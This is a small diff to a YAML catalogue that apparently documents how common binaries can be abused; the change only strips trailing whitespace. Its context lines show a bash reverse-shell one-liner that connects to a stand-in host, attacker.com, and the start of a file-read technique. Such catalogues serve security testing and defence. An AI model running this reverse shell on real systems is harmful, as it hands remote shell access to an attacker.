@@ -40,7 +40,7 @@ functions:
         export RHOST=attacker.com
         export RPORT=12345
         bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1'
-  file-read: 
+  file-read:
     - description: It trims trailing newlines.
       code: |
         export LFILE=file_to_read
